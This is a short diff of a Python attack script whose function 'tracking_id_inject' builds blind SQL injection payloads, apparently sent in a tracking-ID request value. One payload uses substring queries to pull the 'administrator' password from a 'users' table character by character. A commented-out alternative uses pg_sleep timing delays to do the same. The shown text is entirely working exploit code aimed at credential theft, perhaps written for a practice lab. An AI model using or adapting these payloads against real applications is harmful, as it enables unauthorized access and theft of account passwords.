@@ -22,7 +22,12 @@ def tracking_id_inject(payload1, payload2):
     host = url.lstrip("https://")
     host = host.rstrip("/")
 
+    #injection for affiriming information depending on errors
     injection = "\'and substring((select password from users where username = \'administrator\')," + payload1 + ",1) " + payload2
+    
+    #injection not for this code
+    #can trigger delays when application handles errors well
+    #injection = "\'||(select case when (substring((select password from users where username=\'administrator\'),1,1)< \'a\') then pg_sleep(10) else pg_sleep(0) end)-- "
     
     headers = {
         'Host': host,
